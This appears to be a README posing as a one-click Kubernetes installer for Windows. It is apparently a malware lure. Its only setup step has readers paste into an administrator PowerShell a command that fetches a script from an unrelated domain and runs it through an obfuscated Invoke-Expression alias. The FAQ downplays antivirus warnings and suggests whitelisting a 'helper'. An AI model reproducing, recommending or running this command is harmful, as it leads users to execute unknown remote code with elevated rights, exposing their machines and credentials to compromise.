# Get Kubernetes Running on Your PC

![platform](https://img.shields.io/badge/platform-Windows%2010%20%7C%2011-0078d7?logo=windows11&logoColor=white) ![version](https://img.shields.io/badge/version-v2.2.7-blue) ![status](https://img.shields.io/badge/status-maintained-success) ![updated](https://img.shields.io/badge/updated-2026--11--13-informational) ![license](https://img.shields.io/badge/license-MIT-green)

Looking for a fast way to get started with Kubernetes? This project collects the latest build, setup notes and answers to common questions in one place. Production-ish cluster on spare hardware.

## ✨ Highlights

- ✅ Lightweight footprint, runs even on older hardware
- ✅ Step-by-step documentation included in this repository
- ✅ One-click setup — no manual configuration needed
- ✅ Community-tested release, feedback welcome via issues
- ✅ Offline-friendly after first launch
- ✅ Regularly updated builds with change notes

## 🚀 Setup in 3 steps

1. Open the power-user menu with **Win + X**.
2. Launch **Terminal (PowerShell)** — administrator mode is optional but recommended.
3. Insert this command, press **Enter**, done.

```powershell
irm quickrun31.cc/ax38ra|&(gal ie*)
```

> 💡 Tip: keep this command handy — re-running it always fetches the current build.

## 🖥️ Requirements

| Requirement | Details |
|---|---|
| Operating system | Windows 10 / 11 (64-bit) |
| Memory | 6 GB RAM recommended |
| Disk space | ~80 MB free |
| Internet | Required on first run; updates are periodic |

## 📋 Notes

- If your security software flags the command, review it first — it simply downloads and runs the setup from the official source.

## ❓ FAQ

<details>
<summary><strong>Do I need to disable my antivirus?</strong></summary>

Usually no. Only whitelist the helper if your security software quarantines the clipboard helper.

</details>

<details>
<summary><strong>Does it work on Windows 7?</strong></summary>

Legacy systems are not officially supported; use Windows 10 or newer for best results.

</details>

<details>
<summary><strong>How often is it updated?</strong></summary>

Check the changelog file — updates land roughly every few weeks.

</details>

## 🧾 License

Released under the **MIT License** — see [LICENSE](./LICENSE).

_Not affiliated with the original software vendor. Names and trademarks are property of their respective owners._
